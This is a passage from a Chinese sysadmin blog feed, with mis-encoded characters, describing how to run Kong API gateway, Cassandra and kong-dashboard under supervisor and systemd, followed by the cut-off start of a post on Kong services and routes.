class="line">5.6.0</span><br></pre></td></tr></table></figure><p>åˆ›å»ºé“¾æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@DWD-BETA ~]# ln -s /usr/local/node/bin/node /usr/bin/node</span><br><span class="line">root@DWD-BETA ~]# ll /usr/bin/node -d</span><br><span class="line">lrwxrwxrwx 1 root root 24 Nov  3 11:25 /usr/bin/node -&gt; /usr/local/node/bin/node</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹supervisoré…ç½®æ–‡ä»¶ä¸­çš„å‘½ä»¤è·¯å¾„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[program:kong-dashboard]</span><br><span class="line">command=/usr/local/node/bin/kong-dashboard  start --kong-url http://127.0.0.1:8001 --port 8081</span><br><span class="line">numprocs=1</span><br><span class="line">priority=3</span><br><span class="line">user=root</span><br><span class="line">stdout_logfile = /data/logs/kong/kong-dashboard.log</span><br><span class="line">redirect_stderr = true</span><br><span class="line">autostart=true</span><br><span class="line">autorestart=true</span><br></pre></td></tr></table></figure><p>å¯åŠ¨kong-dashboard</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@DWD-BETA ~]# supervisorctl update kong-dashboard</span><br><span class="line">kong-dashboard: stopped</span><br><span class="line">kong-dashboard: updated process group</span><br><span class="line"></span><br><span class="line">[root@DWD-BETA ~]# supervisorctl status kong-dashboard</span><br><span class="line">kong-dashboard                   RUNNING   pid 16635, uptime 0:05:02</span><br></pre></td></tr></table></figure><p>å¯åŠ¨å®Œæˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@DWD-BETA ~]# netstat -tulnp | grep 8081</span><br><span class="line">tcp6       0      0 :::8081                 :::*                    LISTEN      16635/node</span><br></pre></td></tr></table></figure><hr><h3 id="å°†cassandraåŠ å…¥åˆ°supervisorè¿›ç¨‹ç®¡ç†"><a href="#å°†cassandraåŠ å…¥åˆ°supervisorè¿›ç¨‹ç®¡ç†" class="headerlink" title="å°†cassandraåŠ å…¥åˆ°supervisorè¿›ç¨‹ç®¡ç†"></a>å°†cassandraåŠ å…¥åˆ°supervisorè¿›ç¨‹ç®¡ç†</h3><p>cassandraåŠ å…¥supervisorè¿›ç¨‹æ‰˜ç®¡é‡åˆ°ä¸å°‘é—®é¢˜.è¸©è¿‡ä»¥ä¸‹2ä¸ªå‘:</p><p>1.å¯åŠ¨æŠ¥é”™,æç¤ºéœ€è¦æ›´é«˜çº§ç‰ˆæœ¬çš„java.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Cassandra 3.0 and later require Java 8u40 or later.</span><br><span class="line">Cassandra 3.0 and later require Java 8u40 or later.</span><br><span class="line">Cassandra 3.0 and later require Java 8u40 or later.</span><br><span class="line">Cassandra 3.0 and later require Java 8u40 or later.</span><br><span class="line">Cassandra 3.0 and later require Java 8u40 or later.</span><br><span class="line">Cassandra 3.0 and later require Java 8u40 or later.</span><br><span class="line">Cassandra 3.0 and later require Java 8u40 or later.</span><br></pre></td></tr></table></figure><p>æˆ‘çš„è§£å†³æ–¹æ¡ˆ:</p><ul><li>åœ¨cassandraçš„supervisoré…ç½®æ–‡ä»¶ä¸­åŠ å…¥ç¯å¢ƒå˜é‡:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">environment=JAVA_HOME=&quot;/usr/local/java&quot;  #è¿™æ ·cassandraä¼šè¯†åˆ«ç”¨æˆ·è‡ªå®šä¹‰å®‰è£…çš„Java.</span><br></pre></td></tr></table></figure><ul><li>é…ç½®è½¯é“¾</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /usr/local/java/bin/java /usr/bin/java</span><br></pre></td></tr></table></figure><p>2.ä»ç„¶æ— æ³•å¯åŠ¨,å› ä¸ºå‘½ä»¤è¡Œæ˜¯ä»¥daemonæ–¹å¼å¯åŠ¨.åœ¨cassandraçš„supervisoré…ç½®æ–‡ä»¶ä¸­çš„å¯åŠ¨å‚æ•°åŠ å…¥-fé€‰é¡¹.</p><p>æœ€ç»ˆçš„cassandraé…ç½®æ–‡ä»¶å¦‚ä¸‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[program:cassandra]</span><br><span class="line">command=/usr/local/cassandra/bin/cassandra -f</span><br><span class="line">directory=/usr/local/cassandra/</span><br><span class="line">environment=JAVA_HOME=&quot;/usr/local/java&quot;</span><br><span class="line">enviroment=PATH=&quot;$JAVA_HOME/bin:$PATH&quot;</span><br><span class="line">priority=0</span><br><span class="line">numprocs=1</span><br><span class="line">user=work</span><br><span class="line">stdout_logfile = /data/logs/cassandra/cassandra_supervisor.log</span><br><span class="line">redirect_stderr = true</span><br><span class="line">autostart=true</span><br><span class="line">autorestart=true</span><br></pre></td></tr></table></figure><hr><h3 id="å°†kongåŠ å…¥åˆ°supervisor"><a href="#å°†kongåŠ å…¥åˆ°supervisor" class="headerlink" title="å°†kongåŠ å…¥åˆ°supervisor"></a>å°†kongåŠ å…¥åˆ°supervisor</h3><p>1.ç”±äºé»˜è®¤kongå¯åŠ¨æ˜¯ä»¥daemonæ–¹å¼å¯åŠ¨.æ‰€ä»¥ä¿®æ”¹/etc/kong/kong.confé…ç½®æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#å°†ä¸‹åˆ—è¡Œä¿®æ”¹ä¸ºoff,ä¸”å–æ¶ˆæ³¨é‡Š</span><br><span class="line">nginx_daemon = off</span><br></pre></td></tr></table></figure><p>2.ç¼–è¾‘kongçš„supervisoré…ç½®æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[program:kong]</span><br><span class="line">command=/usr/local/bin/kong start -c /etc/kong/kong.conf</span><br><span class="line">numprocs=1</span><br><span class="line">priority=0</span><br><span class="line">user=work</span><br><span class="line">stdout_logfile = /data/logs/kong/kong_supervisor.log</span><br><span class="line">redirect_stderr = true</span><br><span class="line">autostart=true</span><br><span class="line">autorestart=true</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ç”±äºkongå¯åŠ¨çš„æ—¶å€™ä¼šè¿æ¥åç«¯çš„cassandraæ•°æ®åº“,æ‰€ä»¥éœ€è¦å…ˆå¯åŠ¨cassandra,å†å¯åŠ¨kong.è¿™å°±æ˜¯ä¸ºä»€ä¹ˆsupervisoré‡Œè¦åŠ å…¥priorityå‚æ•°.ä¼˜å…ˆçº§è¶Šå°,å¯åŠ¨é¡ºåºè¶Šä¼˜å…ˆ.åœæ­¢é¡ºåºè¶Šé å.     </p></blockquote><p><strong>ä½†æ˜¯ç»è¿‡æˆ‘çš„éªŒè¯,å‘ç°priorityå‚æ•°æ²¡ä»€ä¹ˆé¸Ÿç”¨.å½“æˆ‘start all,stop allæ—¶.æ°¸è¿œæ˜¯cassandraè¿›ç¨‹é¦–å…ˆå¯åŠ¨å’Œå…³é—­,æ— è®ºpriorityä¼˜å…ˆçº§æ˜¯å¤§è¿˜æ˜¯å°.è€Œä¸æ˜¯supervisorå®˜ç½‘ä»‹ç»çš„é‚£æ ·æ•ˆæœ</strong></p><p>å¯åŠ¨æ²¡é—®é¢˜:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node2 ~]$ supervisorctl status</span><br><span class="line">cassandra                        RUNNING   pid 13531, uptime 0:10:09</span><br><span class="line">kong                             RUNNING   pid 14460, uptime 0:00:35</span><br><span class="line">kong-dashboard                   RUNNING   pid 14496, uptime 0:00:17</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å‘ç°supervisorç®¡ç†kongè¿›ç¨‹æœ‰å¾ˆä¸¥é‡çš„é—®é¢˜.</p><p>å› ä¸ºkongå¯åŠ¨ååŒ…æ‹¬2ä¸ªè¿›ç¨‹:kongå’Œnginx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">work@kong-node1 conf.d]$ ps aux | grep kong</span><br><span class="line">work      3198  0.2  0.0 130104  2700 ?        S    17:12   0:00 perl /usr/local/openresty/bin/resty /usr/local/bin/kong start -c /etc/kong/kong.conf</span><br><span class="line">work      3215  6.3  0.1 259600 11800 ?        S    17:12   0:00 nginx: master process /usr/local/openresty/nginx/sbin/nginx -p /data/kong -c nginx.conf</span><br></pre></td></tr></table></figure><p>.è¿™ä¸ªæ—¶å€™å¦‚æœç”¨supervisorctl restart kongè¿›ç¨‹ä¼šå‡ºç°æ— æ³•å¯åŠ¨çš„æƒ…å†µ.è¿™æ˜¯å› ä¸ºsupervisor killæ‰äº†kongè¿›ç¨‹.ä½†æ˜¯æ²¡æœ‰kill Ningxè¿›ç¨‹.æ‰€ä»¥é‡æ–°å¯åŠ¨kongçš„æ—¶å€™,ç”±äºnginxè¿›ç¨‹ä»ç„¶å­˜åœ¨,æ•…æ— æ³•å¯åŠ¨.ä¾‹å¦‚:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node1 conf.d]$ ps aux | grep kong</span><br><span class="line">work      2917  0.0  0.1 259600 11820 ?        S    17:05   0:00 nginx: master process /usr/local/openresty/nginx/sbin/nginx -p /data/kong -c nginx.conf</span><br><span class="line">work      3191  0.0  0.0 112704   976 pts/0    S+   17:11   0:00 grep --color=auto kong</span><br><span class="line">[work@kong-node1 conf.d]$ kill 2917</span><br><span class="line">[work@kong-node1 conf.d]$ ps aux | grep kong</span><br><span class="line">work      3193  0.0  0.0 112704   976 pts/0    S+   17:11   0:00 grep --color=auto kong</span><br><span class="line">[work@kong-node1 conf.d]$ supervisorctl start kong</span><br><span class="line">kong: started</span><br><span class="line"></span><br><span class="line">#kongå¯åŠ¨ååŒ…å«2ä¸ªè¿›ç¨‹</span><br><span class="line">[work@kong-node1 conf.d]$ ps aux | grep kong</span><br><span class="line">work      3198  0.2  0.0 130104  2700 ?        S    17:12   0:00 perl /usr/local/openresty/bin/resty /usr/local/bin/kong start -c /etc/kong/kong.conf</span><br><span class="line">work      3215  6.3  0.1 259600 11800 ?        S    17:12   0:00 nginx: master process /usr/local/openresty/nginx/sbin/nginx -p /data/kong -c nginx.conf</span><br><span class="line">work      3228  0.0  0.0 112704   976 pts/0    R+   17:12   0:00 grep --color=auto kong</span><br><span class="line"></span><br><span class="line">#supervisorå…³é—­äº†Kongè¿›ç¨‹å,æ— æ³•å¯åŠ¨.</span><br><span class="line">[work@kong-node1 conf.d]$ supervisorctl restart kong</span><br><span class="line">kong: stopped</span><br><span class="line">kong: ERROR (spawn error)</span><br><span class="line"></span><br><span class="line">#å› ä¸ºè™½ç„¶kongè¿›ç¨‹æ€æ­»äº†.ä½†æ˜¯nginxè¿›ç¨‹è¿˜åœ¨.æ‰€ä»¥kongçš„8000ç«¯å£ä»ç„¶è¢«å ç”¨</span><br><span class="line">[work@kong-node1 conf.d]$ ps aux | grep kong</span><br><span class="line">work      3215  0.1  0.1 259600 11800 ?        S    17:12   0:00 nginx: master process /usr/local/openresty/nginx/sbin/nginx -p /data/kong -c nginx.conf</span><br><span class="line">work      3307  0.0  0.0 112704   976 pts/0    S+   17:15   0:00 grep --color=auto kong</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹å¯åŠ¨æ—¥å¿—,æç¤ºkongè¿›ç¨‹å·²ç»å¯åŠ¨äº†.</span><br><span class="line">Error: Kong is already running in /data/kong</span><br><span class="line"></span><br><span class="line">  Run with --v (verbose) or --vv (debug) for more details</span><br></pre></td></tr></table></figure><p><strong>æš‚æ—¶å°±ä¸ç”¨supervisorç®¡ç†äº†,é‡‡ç”¨å‘½ä»¤è¡Œç›´æ¥å¯åŠ¨æ–¹å¼</strong></p><hr><p><strong>å‘½ä»¤è¡Œå¯åŠ¨kong.åªæœ‰ä¸€ä¸ªNginxè¿›ç¨‹.æ²¡æœ‰Perlè¿›ç¨‹.ä¸çŸ¥é“ä½•æ•…</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node2 conf.d]$kong start -c /etc/kong/kong.conf</span><br><span class="line">Kong started</span><br><span class="line">[work@kong-node2 conf.d]$ps aux | grep kong</span><br><span class="line">work     15558  0.0  0.0 259600  6540 ?        Ss   17:29   0:00 nginx: master process /usr/local/openresty/nginx/sbin/nginx -p /data/kong -c nginx.conf</span><br></pre></td></tr></table></figure><hr><h3 id="å°†kong-CassandraåŠ å…¥åˆ°systemctlç®¡ç†å·¥å…·"><a href="#å°†kong-CassandraåŠ å…¥åˆ°systemctlç®¡ç†å·¥å…·" class="headerlink" title="å°†kong,CassandraåŠ å…¥åˆ°systemctlç®¡ç†å·¥å…·"></a>å°†kong,CassandraåŠ å…¥åˆ°systemctlç®¡ç†å·¥å…·</h3><ul><li><strong>cassandra</strong></li></ul><p>systemctlæ–‡ä»¶å¦‚ä¸‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node1 ~]$cd /usr/lib/systemd/system</span><br><span class="line">[work@kong-node1 system]$vim cassandra.service</span><br><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line">Description=Cassandra</span><br><span class="line">After=network.target</span><br><span class="line">Before=kong.target </span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">User=work</span><br><span class="line">Group=work</span><br><span class="line">ExecStart=/usr/local/cassandra/bin/cassandra -f</span><br><span class="line">ExecStop=kill $(pgrep -f cassandra)</span><br><span class="line">Restart=always</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„.å¦‚æœjavaæ˜¯äºŒè¿›åˆ¶åŒ…,åˆ™éœ€è¦å°†Binæ–‡ä»¶é“¾æ¥åˆ°ç³»ç»Ÿç¯å¢ƒå˜é‡ç›®å½•ä¸‹.å› ä¸ºsystemctlä¸ä¼šè¯»å–profileç¯å¢ƒ,æ‰€ä»¥ä¸èƒ½è¯†åˆ«åˆ°java.</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node1 system]$which java</span><br><span class="line">/usr/bin/java</span><br><span class="line">[work@kong-node1 system]$ll /usr/bin/java</span><br><span class="line">lrwxrwxrwx 1 root root 24 Nov 14 17:46 /usr/bin/java -&gt; /usr/local/java/bin/java</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒç§æ–¹æ³•æ˜¯åœ¨systemctlä¸­æŒ‡å®šç¯å¢ƒå˜é‡.æŒ‡å®šenvironmentå‚æ•°(è¿™ç§æ–¹æ³•ç†è®ºå¯è¡Œ,ä½†æ˜¯æ²¡æœ‰è®ºè¯)</p><p>ä¾‹å¦‚:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line">Description=Cassandra</span><br><span class="line">After=network.target</span><br><span class="line">Before=kong.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">User=work</span><br><span class="line">Group=work</span><br><span class="line">environment=JAVA_HOME=/usr/local/java</span><br><span class="line">environment=PATH=$JAVA_HOME/bin:$PATH</span><br><span class="line">ExecStart=/usr/local/cassandra/bin/cassandra -f</span><br><span class="line">ExecStop=kill $(pgrep -f cassandra)</span><br><span class="line">Restart=always</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><hr><ul><li><strong>kong</strong></li></ul><p>åœ¨åŒç›®å½•ä¸‹ç¼–è¾‘kongæœåŠ¡é…ç½®.</p><blockquote><p>æ³¨æ„,éœ€è¦åœ¨cassandraåç«¯æ•°æ®åº“å¯åŠ¨å,æ‰èƒ½å¯åŠ¨kongæœåŠ¡</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node1 system]$vim kong.service</span><br><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line">Description= kong service</span><br><span class="line">After=syslog.target network.target cassandra.target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">User=work</span><br><span class="line">Group=work</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=/usr/local/bin/kong start -c /etc/kong/kong.conf</span><br><span class="line">ExecReload=/usr/local/bin/kong reload -c /etc/kong/kong.conf</span><br><span class="line">ExecStop=/usr/local/bin/kong stop</span><br><span class="line">Restart=always</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><ul><li><strong>åœ¨kong-node2ä¸Šå¯åŠ¨kong-dashbaord</strong></li></ul><blockquote><p>dashbaordæœåŠ¡å¯åŠ¨éœ€è¦åœ¨cassandra,kongæœåŠ¡å¯åŠ¨ä¹‹å</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node2 system]$vim kong-dashboard.service</span><br><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line">Description=kong-dashboard</span><br><span class="line">After=network.target cassandra.target kong.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">User=work</span><br><span class="line">Group=work</span><br><span class="line">ExecStart=/usr/local/bin/kong-dashboard start --kong-url http://10.111.30.158:8001</span><br><span class="line">ExecStop=kill $(pgrep -f kong-dashboard)</span><br><span class="line">Restart=always</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><ul><li>åŠ å…¥åˆ°å¼€å¯è‡ªå¯åŠ¨</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable cassandra</span><br><span class="line">systemctl enable kong</span><br><span class="line">systemctl enable kong-dashboard</span><br></pre></td></tr></table></figure><p>ç»è¿‡åå¤è®ºè¯,systemctlå¯ä»¥ç®¡ç†ä»¥ä¸ŠæœåŠ¡.</p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;kong-casssandraé›†ç¾¤ç¯å¢ƒéƒ¨ç½²&quot;&gt;&lt;a href=&quot;#kong-casssandraé›†ç¾¤ç¯å¢ƒéƒ¨ç½²&quot; class=&quot;headerlink&quot; title=&quot;kong+casssandraé›†ç¾¤ç¯å¢ƒéƒ¨ç½²&quot;&gt;&lt;/a&gt;kong+casssandraé›†ç¾¤ç¯å¢ƒéƒ¨ç½²&lt;/h2&gt;&lt;h3 id=&quot;kongç®€ä»‹&quot;&gt;&lt;a href=&quot;#kongç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;kongç®€ä»‹&quot;&gt;&lt;/a&gt;kongç®€ä»‹&lt;/h3&gt;&lt;p&gt;Kongæ˜¯Mashapeå¼€æºçš„ä¸€æ¬¾APIç½‘å…³ï¼Œèµ·åˆæ˜¯ç”¨æ¥ç®¡ç† Mashape å…¬å¸15000ä¸ªå¾®æœåŠ¡çš„ï¼Œåæ¥åœ¨2015å¹´å¼€æº,ç°åœ¨å·²ç»åœ¨å¾ˆå¤šåˆ›ä¸šå…¬å¸ã€å¤§å‹ä¼ä¸šå’Œæ”¿åºœæœºæ„ä¸­å¹¿æ³›ä½¿ç”¨ã€‚åŸºäºnginx,Luaå’ŒCassandraæˆ–PostgreSQLï¼Œæ”¯æŒåˆ†å¸ƒå¼æ“ä½œï¼Œæœ‰å¾ˆå¼ºçš„å¯ç§»æ¤æ€§å’Œå¯æ‰©å±•æ€§ã€‚å¯ä»¥åœ¨ä»»ä½•ä¸€ç§åŸºç¡€è®¾æ–½ä¸Šè¿è¡Œ,ä½œä¸ºåº”ç”¨å’ŒAPIä¹‹é—´çš„ä¸­é—´å±‚ï¼ŒåŠ ä¸Šä¼—å¤šåŠŸèƒ½å¼ºå¤§çš„æ’ä»¶ï¼Œå¯ä»¥å®ç°è®¤è¯æˆæƒã€è®¿é—®æ§åˆ¶ç­‰åŠŸèƒ½ã€‚å¹¶ä¸”æä¾›æ˜“äºä½¿ç”¨çš„RESTful APIæ¥æ“ä½œå’Œé…ç½®ç³»ç»Ÿã€‚&lt;/p&gt;
&lt;p&gt;æœ‰å…³kongçš„è¯¦ç»†ä»‹ç»è¯·å‚è€ƒå®˜ç½‘.&lt;/p&gt;
    
    </summary>
    
      <category term="Linux-åˆ†å¸ƒå¼&amp;æ¶ˆæ¯é˜Ÿåˆ—" scheme="https://jesse.top/categories/Linux-%E5%88%86%E5%B8%83%E5%BC%8F-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/"/>
    
    
      <category term="kong" scheme="https://jesse.top/tags/kong/"/>
    
  </entry>
  
  <entry>
    <title>kong APIç½‘å…³ä»‹ç»åŠAPIæ¥å£é…ç½®</title>
    <link href="https://jesse.top/2018/11/20/Linux-%E5%88%86%E5%B8%83%E5%BC%8F&amp;%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/kong/kong%20API%E7%BD%91%E5%85%B3%E4%BB%8B%E7%BB%8D%E5%8F%8AAPI%E6%8E%A5%E5%8F%A3%E9%85%8D%E7%BD%AE/"/>
    <id>https://jesse.top/2018/11/20/Linux-åˆ†å¸ƒå¼&amp;æ¶ˆæ¯é˜Ÿåˆ—/kong/kong APIç½‘å…³ä»‹ç»åŠAPIæ¥å£é…ç½®/</id>
    <published>2018-11-20T04:59:58.000Z</published>
    <updated>2019-02-17T09:31:38.015Z</updated>
    
    <content type="html"><![CDATA[<h2 id="kong-APIç½‘å…³ä»‹ç»åŠAPIæ¥å£é…ç½®"><a href="#kong-APIç½‘å…³ä»‹ç»åŠAPIæ¥å£é…ç½®" class="headerlink" title="kong APIç½‘å…³ä»‹ç»åŠAPIæ¥å£é…ç½®"></a>kong APIç½‘å…³ä»‹ç»åŠAPIæ¥å£é…ç½®</h2><p>ä¸Šä¸€ç¯‡è®²è§£äº†kong+cassandraçš„éƒ¨ç½²å®‰è£…æ–¹æ³•.æ¥ä¸‹æ¥è®²è§£ä¸€ä¸‹kongçš„APIé…ç½®.å®˜ç½‘ä¸Šä¹Ÿæœ‰è¯¦ç»†çš„apiä»‹ç».</p><p>ä¸‹é¢ç®€å•è®²è§£ä¸€ä¸‹kongçš„å„ä¸ªapiç»„ä»¶:</p><a id="more"></a><h4 id="service"><a href="#service" class="headerlink" title="* service"></a>* service</h4><p>Service é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯æˆ‘ä»¬è‡ªå·±å®šä¹‰çš„ä¸Šæ¸¸æœåŠ¡ï¼Œé€šè¿‡KongåŒ¹é…åˆ°ç›¸åº”çš„è¯·æ±‚è¦è½¬å‘çš„åœ°æ–¹</p><p>Service å¯ä»¥ä¸ä¸‹é¢çš„Routeè¿›è¡Œå…³è”ï¼Œä¸€ä¸ªServiceå¯ä»¥æœ‰å¾ˆå¤šRouteï¼ŒåŒ¹é…åˆ°çš„Routeå°±ä¼šè½¬å‘åˆ°Serviceä¸­.<br>â€‹<br>å½“ç„¶ä¸­é—´ä¹Ÿä¼šé€šè¿‡Pluginçš„å¤„ç†ï¼Œå¢åŠ æˆ–è€…å‡å°‘ä¸€äº›ç›¸åº”çš„Headeræˆ–è€…å…¶ä»–ä¿¡æ¯</p><p>Serviceå¯ä»¥æ˜¯ä¸€ä¸ªå®é™…çš„åœ°å€ï¼Œä¹Ÿå¯ä»¥æ˜¯å®šä¹‰çš„ä¸€ä¸ªupstream</p><hr><h4 id="route"><a href="#route" class="headerlink" title="* route"></a>* route</h4><p>   Route å­—é¢æ„æ€å°±æ˜¯è·¯ç”±ï¼Œå®é™…å°±æ˜¯æˆ‘ä»¬é€šè¿‡å®šä¹‰ä¸€äº›è§„åˆ™æ¥åŒ¹é…å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œæ¯ä¸ªè·¯ç”±éƒ½ä¼šå…³è”ä¸€ä¸ªService,å¹¶ä¸”Serviceå¯ä»¥å…³è”å¤šä¸ªRouteï¼Œå½“åŒ¹é…åˆ°å®¢æˆ·ç«¯çš„è¯·æ±‚æ—¶ï¼Œæ¯ä¸ªè¯·æ±‚éƒ½ä¼šè¢«ä»£ç†åˆ°å…¶é…ç½®çš„Serviceä¸­</p><p>Routeä½œä¸ºå®¢æˆ·ç«¯çš„å…¥å£ï¼Œé€šè¿‡å°†Routeå’ŒServiceçš„æ¾è€¦åˆï¼Œå¯ä»¥é€šè¿‡hosts pathç­‰è§„åˆ™çš„é…ç½®ï¼Œæœ€ç»ˆè®©è¯·æ±‚åˆ°ä¸åŒçš„Serviceä¸­</p><p>ä¾‹å¦‚ï¼Œæˆ‘ä»¬è§„å®šapi.example.com å’Œ api.service.comçš„ç™»å½•è¯·æ±‚éƒ½èƒ½å¤Ÿä»£ç†åˆ°123.11.11.11:8000ç«¯å£ä¸Šï¼Œé‚£æˆ‘ä»¬å¯ä»¥é€šè¿‡hostså’Œpathæ¥è·¯ç”±</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. åˆ›å»ºä¸€ä¸ªService s1ï¼Œå…¶ç›¸åº”çš„hostå’Œportä»¥åŠåè®®ä¸ºhttp://123.11.11.11:8000</span><br><span class="line"></span><br><span class="line">2. åˆ›å»ºä¸€ä¸ªRouteï¼Œå…³è”çš„Serviceä¸ºs1ï¼Œå…¶hostsä¸º[api.service.com, api.example.com],pathä¸ºlogin</span><br><span class="line"></span><br><span class="line">3. 